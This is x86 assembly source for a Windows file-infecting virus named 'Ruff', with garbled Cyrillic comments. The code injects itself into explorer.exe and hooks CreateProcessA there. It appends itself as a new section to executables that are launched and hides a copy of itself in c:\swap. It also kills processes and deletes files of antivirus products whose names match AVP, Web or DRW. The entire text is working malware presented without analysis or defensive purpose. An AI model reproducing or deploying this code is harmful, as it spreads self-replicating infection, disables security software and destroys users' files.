   swap_file equ 'c:\swap',0
   ;DEBUG equ YES
   include win32api.inc
   include rulez.inc
   include process.inc
   include pe.inc
   .586
   locals __
   model flat
   .data
   extrn      ExitProcess:Proc
   extrn      GetLastError:Proc
   mess db   'Ruff',0
   .code
   start:
   IFDEF DEBUG
   int   3
   ELSE
   ENDIF
   call get_offset
   get_offset:
   pop   ebp                       ;ebp=offset
   sub   ebp,offset get_offset
   mov   [counter+ebp],0           ;®¡ã«¨¬ ¯¥à¥¬¥ë¥
   mov   [process_to_open+ebp],0
   mov   eax,[new_rva+ebp]
   mov   [old_rva+ebp],eax
   pop   eax                       ;eax=address of entry of exit function
   push  eax
   and   eax,0ffff0000h             ;®ªàã£«ï¥¬ ¤® ªà â®£® 65536
   add   eax,65536
   __not_found:
   sub  eax,65536
   cmp  word ptr [eax],'ZM'
   jne  __not_found                 ;eax - § £àã§®çë©  ¤à¥á kernel32
   mov   [kernel_base+ebp],eax
   mov   ebx,eax                    ;ebx - § £àã§®çë©  ¤à¥á kernel32
   push  ebx
   add   ebx,[ebx.exe_neptr]        ;eax -  ç «® PE-header'a
   cmp   word ptr  [ebx],'EP'
   je    kernel_found
   pop   ebx
   jmp   goto_host
   kernel_found:
   add    eax,[ebx+78h]              ;eax= rva of export table
   pop    ebx

   push   eax eax
   push   ebx ebx
   add    ebx,[eax.ED_AddressOfNames] ;ebx = array of RVA to names
   pop    eax ecx
   __0:
   push   eax
   add    eax,[ebx]                  ;eax=Rva of first exported function
   add    ebx,4
   inc    [counter+ebp]
   lea    esi,[sGetProcAddress+ebp+4]
   mov    edi,eax
   call   StrCompare
   pop    eax
   je     GetProcFound
   jmp    __0
   GetProcFound:
   pop    ebx
   push   eax
   add    eax,[ebx.ED_AddressOfOrdinals] ;ebx = array of ordinals to names
   movzx   ecx,[counter+ebp]
   shl    ecx,1
   add    eax,ecx                         ;eax=address ordinal of getprocaddress
   mov    cx,word ptr [eax]
   pop    eax
   pop    ebx                              ;ebx= adrress of export table
   sub    ecx,[ebx.ED_BaseOrdinal]
   mov    [getpraddrord+ebp],cx
   add    eax,[ebx.ED_AddressOfFunctions]  ;eax=rva of functions
   movzx  ecx,[getpraddrord+ebp]
   shl    ecx,2
   mov    ebx,eax
   add    ebx,ecx
   mov    ebx,[ebx]
   add    ebx,[kernel_base+ebp]
   mov    [sGetProcAddress+ebp],ebx
   ;¯®«ãç¨âì  ¤à¥á  äãªæ¨©
   lea    edi,[sBeep+ebp+4]     ;ebx = offset of array of function names
   __2:
   push   edi
   push   edi
   push   dword ptr [kernel_base+ebp]
   mov    eax,[sGetProcAddress+ebp]
   call   eax
   pop    edi
   mov    [edi-4],eax
   mov    ecx,0ffh
   xor    al,al
   repnz  scasb
   add    edi,4
   cmp    byte ptr [edi],0
   je     all_funct_found
   jmp    __2
   all_funct_found:
   ; ©â¨ explorer ¨ ¨áâ ««¨à®¢ âìáï ¢ ¯ ¬ïâì
   push   0
   push   TH32CS_SNAPPROCESS
   mov    eax,[sCreateToolhelp32Snapshot+ebp]
   call   eax
   mov    [hSnapshot+ebp],eax             ;eax = HSnapShot
   mov    [prentry+ebp].dwSize,pr_size

   lea    ebx,[prentry+ebp]
   push   ebx
   push   eax
   mov    eax,[sProcess32First+ebp]
   call   eax
   ll:
   lea    ebx,[prentry+ebp]
   push   ebx
   push   [hSnapshot+ebp]
   mov    eax,[sProcess32Next+ebp]
   call   eax
   or     eax,eax
   jz     end_of_list
   xor    ax,ax
   lea    edi,[prentry+ebp].szExeFile
   mov    ecx,0ffffh
   cld
   repnz  scasb
   mov    al,'\'
   std
   mov    cx,0ffffh
   repnz  scasb
   add    edi,2
   call   is_bad_prog
   or     eax,eax
   jz     not_bad_prog
   call   TerminateBadProg
   not_bad_prog:
   cmp    [edi],'LPXE'
   je     expl_found
   jmp    ll
   expl_found:
   mov    eax,[prentry+ebp.th32ProcessID]
   mov    [process_to_open+ebp],eax
   jmp    ll
   end_of_list:
   cmp    [process_to_open+ebp],0
   je     goto_host
   ; ©¤ñ¬ ¬®¤ã«ì SHELL32
   cld
   push   [hSnapshot+ebp]
   mov    eax,[sCloseHandle+ebp]
   call   eax
   push   [process_to_open+ebp]
   push   TH32CS_SNAPMODULE
   mov    eax,[sCreateToolhelp32Snapshot+ebp]
   call   eax
   mov    [hSnapshot+ebp],eax
   mov    [modentry+ebp.dwSize],mod_size
   push   eax                      ;eax = HSnapShot
   lea    ebx,[modentry+ebp]
   push   ebx
   push   eax
   mov    eax,[sModule32First+ebp]
   call   eax
   pop    eax
   lea    ebx, modentry+ebp.szModule
   lea    ecx, modentry+ebp.szExePath
   qq:
   push   eax                      ;eax = HSnapShot
   mov    [modentry+ebp.dwSize],mod_size
   cld
   lea    ebx,[modentry+ebp]
   push   ebx
   push   eax
   mov    eax,[sModule32Next+ebp]
   call   eax
   or     eax,eax
   jz     shell32_not_found
   pop    eax
   cmp    dword ptr [modentry+ebp.szModule],'LEHS'
   je     shell32_found
   jmp    qq
   shell32_not_found:
   jmp    goto_host
   shell32_found:

   push   [hSnapshot+ebp]
   mov    eax,[sCloseHandle+ebp]
   call   eax

   push   [process_to_open+ebp]
   push   1
   ;Open process with all access rights
   push   PROCESS_ALL_ACCESS
   mov    eax,[sOpenProcess+ebp]
   call   eax
   mov    [open_handle+ebp],eax
   IFDEF DEBUG
   int   3
   ELSE
   ENDIF
   ;¢ë¤¥«ï¥¬ ¯ ¬ïâì (GlobalAlloc ˆ VirtualAlloc ¤«ï ¡ãä¥à  ¯®¤ hintnames
   ;¨§ å®áâ ,  ç¨ ¥¬ ¯®¨áª ¥®¡å®¤¨¬ëå ä-¨©, áçñâç¨ª ä-¨© = index
   ;¢ Address table
   push   2*4096
   push   0
   mov    eax,[sGlobalAlloc+ebp]
   call   eax
   mov    [buffer+ebp],eax
   ;¯à®¢¥à¨âì, ¥ § ¯¨á ë «¨¨ ¬ë ã¦¥ âã¤ 
   push    eax
   lea    ebx,nmbofread+ebp
   push   ebx
   push   20
   push   eax
   push   400000h
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   pop    eax
   cmp    [eax],'RUFF'
   je     goto_host
   mov    eax,[modentry.modBaseAddr+ebp]
   mov    [base_addr+ebp],eax
   ;read process header
   lea    ebx,nmbofread+ebp
   push   ebx
   push   40h
   push   [buffer+ebp]
   push   [base_addr+ebp]
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   mov    eax,[buffer+ebp]
   mov    eax,[eax+3ch]
   add    eax,[base_addr+ebp]       ;ãª § â¥«ì   PE header
   IFDEF DEBUG
   int   3
   ELSE
   ENDIF
   lea    ebx,nmbofread+ebp         ;ç¨â ¥¬ PE-header
   push   ebx
   push   100h
   push  [buffer+ebp]
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   call   fcheckerror
   jc     goto_host
   mov    eax,[buffer+ebp]
   mov    eax,[eax+80h]
   add    eax,[base_addr+ebp]       ;we got Import table directory address
   IFDEF DEBUG
   int   3
   ELSE
   ENDIF
   __3:
   push   eax
   lea    ebx,nmbofread+ebp
   push   ebx                       ;ç¨â ¥¬ ª â «®£ ¨¬¯®àâ 
   push   14h
   push   [buffer+ebp]
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   mov    eax,[buffer+ebp]
   mov    eax,[eax+0ch]
   add    eax,[base_addr+ebp]              ;eax - import library RVA
   lea    ebx,nmbofread+ebp         ;ç¨â ¥¬ ¨¬ï ¡¨¡«¨®â¥çª¨
   push   ebx
   push   8
   mov    ebx,[buffer+ebp]
   add    ebx,20h
   push   ebx
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   mov    eax,[buffer+ebp]
   add    eax,20h
   mov    edi,eax
   mov   byte ptr  [edi+8],0
   lea    esi,[n_kernel+ebp]
   call   StrCompare
   pop   eax
   je    __2                              ;á«¥¤ãîé ï ¤¨à¥ªâ®à¨ï
   add   eax,14h
   jmp    __3                       ;á«¥¤ãîé ï ¤¨à¥ªâ®à¨ï
   __2:                             ;ª â «®£ ¨¬¯®àâ  ¤«ï KERNEL32  ©¤¥
   ;¢ EAX - ª â «®£ ¨¬¯®àâ  ¤«ï KERNEL32
   mov    eax,[buffer+ebp]
   mov    eax,[eax]                 ;¢ EAX - Table of Hint Names RVA's
   add    eax,[base_addr+ebp]
   lea    ebx,nmbofread+ebp         ;ç¨â ¥¬ 4096 ¡ ©â RVA HINTNAMES
   push   ebx
   push   4096
   mov    ebx,[buffer+ebp]          ;ç¨â ¥¬ ¢ buffer +4096
   add    ebx,4096
   push   ebx
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   mov    eax,[buffer+ebp]          ;¢ eax - buffer+4096
   add    eax,4096
   cld
   mov     [counter+ebp],0
   IFDEF DEBUG
   int   3
   ELSE
   ENDIF
   go:
   inc    [counter+ebp]
   push   eax
   mov    eax,[eax]
   add    eax,2
   add    eax,[base_addr+ebp]
   lea    ebx,nmbofread+ebp         ;ç¨â ¥¬ ¨¬ï äãªæ¨¨
   push   ebx
   push   15
   push   [buffer+ebp]                 ;ç¨â ¥¬ ¢ buffer
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   mov    edi,[buffer+ebp]
   find_cp:
   lea    esi,sCreateProcess+ebp+4
   call   StrCompare
   pop    eax                       ;áà ¢¨¢ ¥¬ ¨¬¥  äãªæ¨©
   je     cp_found
   again:
   add    eax,4
   jmp    go
   cp_found:
   mov       eax,[sCloseHandle+ebp]
   mov       [ch_addr+ebp],eax
   mov       eax,[sDeleteFile+ebp]
   mov       [df_addr+ebp],eax
   mov       eax,[sCreateFileA+ebp]
   mov       [cf_addr+ebp],eax
   mov       eax,[sReadFile+ebp]
   mov       [rf_addr+ebp],eax
   mov       eax,[sGlobalAlloc+ebp]
   mov       [ga_addr+ebp],eax
   mov      eax,[buffer+ebp]
   mov      eax,[eax+10h]                ;eax=RVA of ADdress table
   movzx    ebx,[counter+ebp]
   imul     ebx,4                      ;eax=entry for CreateProcess  !!
   add      eax,ebx
   add      eax,[base_addr+ebp]
   sub      eax,4
   push     eax
   mov     [cp_addr+ebp],eax
   lea    ebx,nmbofread+ebp     ;§ ¯¨á âì áâ àë©  ¤à¥á ä-¨¨
   push   ebx
   push   4
   lea    ebx, old_addr+ebp
   push   ebx
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sReadProcessMemory+ebp]
   call   eax
   ;mov    eax,[sMessageBox+ebp]
   ;mov    [mb_addr+ebp],eax
   lea    ebx,nmbofwrt+ebp           ;§ ¯¨á âì  è ª®¤    ¤à¥á 400000h
   push   ebx
   push   module_size
   lea    ebx, module+ebp
   push   ebx
   push   400000h
   push   [open_handle+ebp]
   mov    eax,[sWriteProcessMemory+ebp]
   call   eax
   pop    eax
   mov    ebx,[buffer+ebp]
   mov    [ebx],400000h
   lea    ebx,nmbofwrt+ebp          ;§ ¬¥¨âì  ¤à¥á ä-¨¨
   push   ebx
   push   4
   push   [buffer+ebp]
   push   eax
   push   [open_handle+ebp]
   mov    eax,[sWriteProcessMemory+ebp]
   call   eax
   call   fcheckerror
   jc     goto_host
   ;®âªàëâì ä ©« 'c:\swap'
   push     0
   push     FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
   push     CREATE_ALWAYS
   push     0
   push     0                      ;SHARED MODE
   push     GENERIC_WRITE          ;access
   lea      ebx,filename+ebp
   push     ebx
   mov      eax,[sCreateFileA+ebp]
   call     eax
   ;§ ¯¨á âì ®á®¢®¥ â¥«® ¢¨àãá  âã¤ 
   push     eax
   push     0         ;overlapped stucture = 0
   lea      ebx,nobw+ebp
   push     ebx        ;number of bytes written
   push     vir_size
   lea      ebx,start+ebp
   push     ebx
   push     eax
   mov      eax,[sWriteFile+ebp]
   call     eax
   mov      eax,[sCloseHandle+ebp]
   call     eax
   ;¢¥àãâì ã¯à ¢«¥¨¥
   ;push   0
   ;call   ExitProcess
   goto_host:
   push     [open_handle+ebp]
   mov      eax,[sCloseHandle+ebp]
   call     eax
   goto_host_1:
   db   0b8h
   old_rva                 dd        offset host
   jmp                     eax
   new_rva                 dd        offset host
   main_body_jmp=$-start
   main_body:
   pushf
   ;pusha
   push   ebx ecx edx esi edi ebp
   call  __1
   __1:
   pop   ebp
   sub   ebp,offset __1
   mov   edx,[esp+0ch+24]               ;eax=file to infect
   mov   al,' '
   cmp   byte ptr [edx],'"'
   jne   __2
   mov   al,'"'
   add   edx,1
   __2:
   mov   edi,edx
   mov   ecx,0ffh
   repnz   scasb
   mov   byte ptr [edi-1],0
   mov   bl,al
   push  edi
   mov   edi,edx
   call  is_bad_prog
   pop   edi
   or    eax,eax
   jz    __good_prog
   ;edi=end of program name
   ;edx=beginning of the path
   call   DeleteBadProg
   mov    byte ptr  [edi-1],bl
   pop    ebp edi esi edx ecx ebx
   popf
   stc
   db   0c2h
   dw   10*4
   __good_prog:
   push  edi ebx
   call  fopenEx
   pop   edx  edi
   mov   byte ptr  [edi-1],dl
   jc    not_opened

                           mov     [maphandle+ebp], eax
                           mov     [filehandle+ebp], ebx
                           mov     [filesize+ebp], ecx
                           push    eax
   ;ã§ âì ¢à¥¬ï ä ©« 
   lea      ebx,[faccess_time+ebp]
   push     ebx
   lea      ebx,[fwrite_time+ebp]
   push     ebx
   lea      ebx,[fcreate_time+ebp]
   push     ebx
   push     [filehandle+ebp]
   mov      eax,[sGetFileTime+ebp]
   call     eax
   xor   ecx,ecx
   call    is_infected
   or    eax,eax
   pop   eax
   jz    dont_infect

                           mov     ebx,[eax+3ch]           ;ebx=PE header
                           add     ebx,eax
                           cmp     word ptr [ebx],'EP'
                           jne     dont_infect

                           mov     [pe_head+ebp],ebx
                           mov     eax,[ebx+38h]
                           mov     [obj_align+ebp],eax
                           mov     eax,[ebx+3ch]
                           mov     [file_align+ebp],eax
                           movzx   ecx,word ptr [ebx+6h]    ;num of objects
                           inc     word ptr [ebx+6]
                           dec     ecx                      ;last object in table
                           imul    cx,28h
                           add     bx, word ptr [ebx+14h]  ;NT header size
                           add     ebx,18h                 ;ebx= object table
                           add     ebx,ecx             ;ebx=last object in table
                           push    ebx
                           xor     edx,edx
                           lea     ecx,new_sec_head+ebp
   ;almost random name

   ;á®áç¨â ¥¬ RVA
                           mov     eax,[ebx.RVA]
                           add     eax,[ebx.VirtualSize]
                           div     [obj_align+ebp]
                           add     eax,1
                           imul    eax,[obj_align+ebp]
                           mov     [ecx.RVA],eax
   ;á®áç¨â ¥¬ Virtual Size
                           xor     edx,edx
                           mov     eax,vir_size
                           div     [obj_align+ebp]
                           add     eax,1
                           imul    eax,[obj_align+ebp]
                           mov     [ecx.VirtualSize],eax
   ;á®áç¨â ¥¬ Physical Size
                           xor     edx,edx
                           mov     eax,vir_size
                           div     [file_align+ebp]
                           add     eax,1
                           imul    eax,[file_align+ebp]
                           mov     [ecx.PhysSize],eax
   ;á®áç¨â ¥¬ Physical Offset
                           xor     edx,edx
                           mov     eax,[ebx.PhysOffset]
                           add     eax,[ebx.PhysSize]
                           mov     [ecx.PhysOffset],eax
                           pop     ebx
                           lea     esi,new_sec_head+ebp
                           mov     edi,ebx
                           add     edi,28h
                           push    ecx
                           mov     ecx,28h
                           rep     movsb
                           pop     ecx
                           mov     ebx,[pe_head+ebp]
                           mov     eax,[ecx.VirtualSize]
                           add     [ebx+50h],eax           ;Image Size
                           mov     eax,[ebx+28h]           ;Entry point RVA
                           add     eax,[ebx+34h]           ;add image base
                           mov     [new_rva+ebp],eax

                           mov     eax,[ecx.RVA]           ;Entry point RVA
                           mov     [ebx+28h],eax


                           lea     esi,start+ebp
                           mov     edi,[ecx.PhysOffset]
                           add     edi,[maphandle+ebp]
                           mov     ecx,vir_size
   ;                       mov     ecx,[ecx.PhysSize]
                           rep     movsb

   ;exit:
                           call    mark_infection

   ;ãáâ ®¢¨âì ¢à¥¬ï ä ©« 
   lea      ebx,[faccess_time+ebp]
   push     ebx
   lea      ebx,[fwrite_time+ebp]
   push     ebx

   lea        ebx,[fcreate_time+ebp]
   push      ebx

   push      [filehandle+ebp]
   mov       eax,[sSetFileTime+ebp]
   call     eax
                           lea     ecx,new_sec_head+ebp
                           mov     ecx, [ecx.PhysSize]
   dont_infect:
                           add     ecx, [filesize+ebp]
                           mov     eax, [maphandle+ebp]  ; unmap, trunc. & close file
                           mov     ebx, [filehandle+ebp]
                           call    fcloseEx
   ;popa
   not_opened:
   mov    eax,[old_addr+ebp]
   pop    ebp edi esi edx ecx ebx
   popf
   jmp   eax
   mark_infection:
   lea      ebx,[fcreate_time+ebp]
   mov   word ptr  [ebx.FT_dwLowDateTime+3],11001011110b
   ret
   is_infected:
   lea      ebx,[fcreate_time+ebp]
   mov      eax,0                       ;infected
   cmp   word ptr  [ebx.FT_dwLowDateTime+3],11001011110b
   je       __1
   mov      eax,1                       ;not infected
   __1:
   ret
   TerminateBadProg:
   push   [prentry.th32ProcessID+ebp]
   push   1
   ;Open process with all access rights
   push   PROCESS_ALL_ACCESS
   mov    eax,[sOpenProcess+ebp]
   call   eax
   push   2
   push   eax
   mov    eax,[sTerminateProcess]
   call   eax
   ret
   is_bad_prog:
   ;edi = our prog
   push      edi esi ecx edx
   cld
   lea       esi,term1+ebp
   __1:
   call      StrPos
   jz        __bad_prog_found
   mov       ecx,0ffh
   push      edi
   mov       edi,esi
   xor       al,al
   repnz     scasb
   mov       esi,edi
   pop       edi
   xor       eax,eax
   cmp       byte ptr  [esi],0
   je        __exit
   jmp       __1
   __bad_prog_found:
   mov       eax,1
   __exit:
   pop       edx ecx esi edi
   ret
   DeleteBadProg:
   push   eax edi ecx edx
   std
   mov     al,'\'
   mov     ecx,0ffh
   repnz   scasb
   add     edi,2   ;edi= end of directory
   push     edx
   mov      byte ptr [edi],0
   lea      ebx,curr_directory+ebp
   push     ebx
   push     MAX_PATH
   mov      eax,[sGetCurrentDirectory+ebp]
   call     eax
   mov      eax,[sSetCurrentDirectory+ebp]
   call     eax
   or       eax,eax
   jz       __exit
   lea      ebx,wfd+ebp
   push     ebx
   lea      ebx,mask+ebp
   push     ebx
   mov      eax,[sFindFirstFileA+ebp]
   call     eax
   push     eax            ;eax=handle
   __delete_it:
   lea      ebx,wfd.WFD_szFileName+ebp
   push     ebx
   mov      eax,[sDeleteFile+ebp]
   call     eax
   pop      eax
   push     eax            ;;
   lea      ebx,wfd+ebp
   push     ebx
   push     eax
   mov      eax,[sFindNextFileA+ebp]
   call     eax
   or       eax,eax
   jnz      __delete_it
   pop      eax
   lea      ebx,[curr_directory+ebp]
   push     ebx
   mov      eax,[sSetCurrentDirectory+ebp]
   call     eax
   __exit:
   pop      edx ecx edi eax
   ret
   old_addr  dd 0
   ;mb_addr   dd 0
   include _fio.inc
   include _fioEx.inc
   include  strings.asm
   fcreate_time       FILETIME ?
   fwrite_time       FILETIME ?
   faccess_time       FILETIME ?
   filemaphandle           dd      ?
   filehandle              dd      ?
   maphandle               dd      ?
   filesize                dd      ?
   obj_align               dd      ?
   file_align              dd      ?
   new_sec_head            section_header <'Ruff',,,vir_size>
   pe_head                 dd      ?
   sBeep        dd 0
   db 'Beep',0
   sCreateProcess        dd 0
   db 'CreateProcessA',0
   sGetLastError dd 0
   db 'GetLastError',0
   sTerminateProcess dd 0
   db 'TerminateProcess',0
   sCreateFileA dd 0
   db 'CreateFileA',0
   sCloseHandle dd 0
   db 'CloseHandle',0
   sSetFilePointer dd 0
   db 'SetFilePointer',0
   sReadFile dd 0
   db 'ReadFile',0
   sWriteFile dd 0
   db 'WriteFile',0
   sCreateFileMappingA dd 0
   db 'CreateFileMappingA',0
   sMapViewOfFile dd 0
   db 'MapViewOfFile',0
   sUnmapViewOfFile dd 0
   db 'UnmapViewOfFile',0
   sGetFileSize dd 0
   db 'GetFileSize',0
   sSetEndOfFile dd 0
   db 'SetEndOfFile',0
   sDeleteFile dd 0
   db 'DeleteFileA',0
   sGetProcAddress dd 0
   db 'GetProcAddress',0
   sGetModuleHandle dd 0
   db 'GetModuleHandleA',0
   sGetFileTime dd 0
   db 'GetFileTime',0
   sSetFileTime dd 0
   db 'SetFileTime',0
   sFindFirstFileA dd 0
   db 'FindFirstFileA',0
   sFindNextFileA dd 0
   db 'FindNextFileA',0
   sGetWindowsDirectory dd 0
   db 'GetWindowsDirectoryA',0
   sCreateToolhelp32Snapshot dd 0
   db 'CreateToolhelp32Snapshot',0
   sGetCurrentDirectory dd 0
   db 'GetCurrentDirectoryA',0
   sSetCurrentDirectory dd 0
   db 'SetCurrentDirectoryA',0
   sProcess32First dd 0
   db 'Process32First',0
   sProcess32Next dd 0
   db 'Process32Next',0
   sModule32First dd 0
   db 'Module32First',0
   sModule32Next dd 0
   db 'Module32Next',0
   sWriteProcessMemory dd 0
   db 'WriteProcessMemory',0
   sReadProcessMemory dd 0
   db 'ReadProcessMemory',0
   sOpenProcess dd 0
   db 'OpenProcess',0
   sGlobalAlloc dd 0
   db 'GlobalAlloc',0,0,0,0,0,0
   ;                          ^end signature
   ;exe_mask db '*.exe',0
   module:
   pushf
   push   eax ebx ecx edx esi edi ebp
   ;¢ë¤¥«¨âì ¯ ¬ïâì
   push    vir_size+100
   push    0
   mov     eax,_ga_addr
   call    [eax]
   push    eax
   push    0
   push     FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
   push     OPEN_EXISTING
   push     0
   push     0                     ;SHARED MODE
   push     GENERIC_READ          ;access
   push     _filename
   mov      eax,_cf_addr
   call     [eax]
   mov      ebx,400000h
   mov      [ebx],'RUFF'
   ;§ ¯¨á âì ®á®¢®¥ â¥«® ¢¨àãá  âã¤ 
   pop      ebx                  ;ebx=allocated memory
   push     ebx
   push     eax
   push     0                    ;overlapped stucture = 0
   push     _nobr                ;number of bytes readen
   push     vir_size
   push     ebx                  ;ebx=allocated memory
   push     eax
   mov      eax,_rf_addr
   call     [eax]
   mov      eax,_ch_addr
   call     [eax]
   push     _filename
   mov      eax,_df_addr
   call     [eax]
   pop      ebx
   mov      eax,_cp_addr
   mov      eax,[eax]
   add      ebx,main_body_jmp
   mov      [eax],ebx
   mov       eax,ebx
   pop     ebp edi esi edx ecx ebx ebx
   popf
   jmp      eax                  ;ebx=allocated memory
   _cp_addr=$-module+400000h
   cp_addr  dd    0
   _nobr=$-module+400000h
   nobr     dd              0
   _filename=$-module+400000h
   filename db swap_file
   _cf_addr=$-module+400000h
   cf_addr dd 0                    ;Createfilea
   _ch_addr=$-module+400000h
   ch_addr dd 0                    ;CloseHandle
   _rf_addr=$-module+400000h
   rf_addr dd 0                    ;readfile
   _ga_addr=$-module+400000h
   ga_addr dd 0                    ;globalalloc
   _df_addr=$-module+400000h
   df_addr dd 0
   module_size=$-module
   coolmessage db 'We are the Ruffest !',0
   db '(c) Charly',0
   ;sMessageBox dd 0
   ;db 'MessageBoxA',0
   open_handle dd 0
   hSnapshot dd    0
   nmbofread dd 0
   nmbofwrt  dd 0
   base_addr dd 0               ;¡ §®¢ë©  ¤à¥á ¬®¤ã«ï á ª®â®àë¬ ¬ë à ¡®â ¥¬
   buffer dd 0                  ;á®¤¥à¦¨â  ¤à¥á ¢ë¤¥«¥®©  ¬ ¯ ¬ïâ¨
   prentry PROCESSENTRY32 <>
   pr_size=$-prentry
   modentry MODULEENTRY32 <>
   mod_size=$-modentry
   term1     db 'AVP',0
             db 'avp',0
             db 'Avp',0
             db 'Web',0
             db 'web',0
             db 'Drw',0
             db 'DRW',0
             db 'drw',0,0
   n_kernel db 'KERNEL32',0
   ;n_user db   'USER32',0
   process_to_open dd 0
   nobw   dd 0
   kernel_base dd 0
   curr_directory  db MAX_PATH dup(0)
   get_proc_addr dd 0
   ;get_wnd_dir db MAX_PATH dup(0)
   getpraddrord dw 0
   counter dw   0
   mask    db '*.*',0
   wfd WIN32_FIND_DATA <>
   vir_size=$-start
   host:
   push             0
   call             ExitProcess
   end  start
